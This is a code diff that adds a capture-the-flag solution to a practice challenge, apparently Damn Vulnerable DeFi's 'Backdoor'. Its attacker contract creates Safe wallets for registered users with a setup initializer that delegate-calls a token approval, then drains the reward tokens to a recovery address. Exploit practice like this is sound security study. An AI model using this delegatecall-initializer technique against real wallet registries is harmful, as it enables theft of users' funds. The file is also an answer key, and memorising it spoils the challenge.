@@ -7,6 +7,51 @@ import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
+import {ERC20} from "solmate/tokens/ERC20.sol";
+import {Enum} from "safe-smart-account/contracts/common/Enum.sol";
+
+contract BackdoorAttack {
+    SafeProxyFactory immutable i_factory;
+    WalletRegistry immutable i_registry;
+    Safe immutable i_singleton;
+    address[] s_users;
+    DamnValuableToken immutable i_token;
+    address immutable i_recovery;
+
+    constructor(
+        SafeProxyFactory walletFactory,
+        Safe singletonCopy,
+        WalletRegistry walletRegistry,
+        address[] memory users,
+        DamnValuableToken token,
+        address recovery
+    ) {
+        i_factory = walletFactory;
+        i_singleton = singletonCopy;
+        i_registry = walletRegistry;
+        s_users = users;
+        i_token = token;
+        i_recovery = recovery;
+    }
+
+    function attack() external {
+        for (uint256 i = 0; i < s_users.length; i++) {
+            address[] memory owner = new address[](1);
+            owner[0] = s_users[i];
+            bytes memory helperData = abi.encodeCall(this.approveFromProxy, (address(i_token), address(this), 10e18));
+
+            bytes memory initializer = abi.encodeCall(
+                Safe.setup, (owner, 1, address(this), helperData, address(0), address(0), 0, payable(address(0)))
+            );
+            address proxy = address(i_factory.createProxyWithCallback(address(i_singleton), initializer, 0, i_registry));
+            i_token.transferFrom(proxy, i_recovery, 10e18);
+        }
+    }
+
+    function approveFromProxy(address token, address spender, uint256 amount) external {
+        ERC20(token).approve(spender, amount);
+    }
+}
 
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -69,7 +114,9 @@ contract BackdoorChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_backdoor() public checkSolvedByPlayer {}
+    function test_backdoor() public checkSolvedByPlayer {
+        new BackdoorAttack(walletFactory, singletonCopy, walletRegistry, users, token, recovery).attack();
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
